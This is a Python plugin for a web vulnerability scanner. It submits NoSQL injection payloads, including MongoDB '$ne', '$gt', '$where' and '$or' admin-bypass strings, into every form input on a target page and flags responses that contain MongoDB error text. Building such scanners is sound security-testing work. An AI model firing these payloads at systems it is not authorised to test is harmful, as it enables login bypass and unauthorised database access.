def scan(scanner):
    """Scan for NoSQL Injection vulnerabilities"""
    print("[PLUGIN] Scanning for NoSQL Injection vulnerabilities...")
    nosql_payloads = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$where": "1==1"}',
        '{"$exists": true}',
        '{"$regex": ".*"}',
        '{"$in": ["admin", "user"]}',
        '{"$or": [{"user": "admin"}, {"pass": "test"}]}'
    ]
    try:
        response = scanner.session.get(scanner.target_url, timeout=scanner.timeout)
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            form_action = form.get('action', '')
            form_method = form.get('method', 'get').lower()
            if form_action:
                test_url = scanner.urljoin(scanner.target_url, form_action)
            else:
                test_url = scanner.target_url
            inputs = form.find_all('input')
            for input_field in inputs:
                input_name = input_field.get('name')
                if input_name:
                    for payload in nosql_payloads:
                        if form_method == 'post':
                            data = {input_name: payload}
                            try:
                                response = scanner.session.post(test_url, data=data, timeout=scanner.timeout)
                            except:
                                continue
                        else:
                            test_url_with_payload = f"{test_url}?{input_name}={scanner.urllib.parse.quote(payload)}"
                            try:
                                response = scanner.session.get(test_url_with_payload, timeout=scanner.timeout)
                            except:
                                continue
                        nosql_indicators = [
                            'mongo', 'mongodb', 'nosql', 'bson', 'objectid',
                            'mongoerror', 'mongodb error', 'bson error'
                        ]
                        response_text = response.text.lower()
                        for indicator in nosql_indicators:
                            if indicator in response_text:
                                scanner.log_vulnerability(
                                    'NoSQL Injection',
                                    'Critical',
                                    f'NoSQL injection vulnerability detected in parameter {input_name}',
                                    f'Payload: {payload}, Indicator: {indicator}',
                                    'CWE-943'
                                )
                                break
    except Exception as e:
        print(f"[PLUGIN][NoSQLi] Error: {e}") 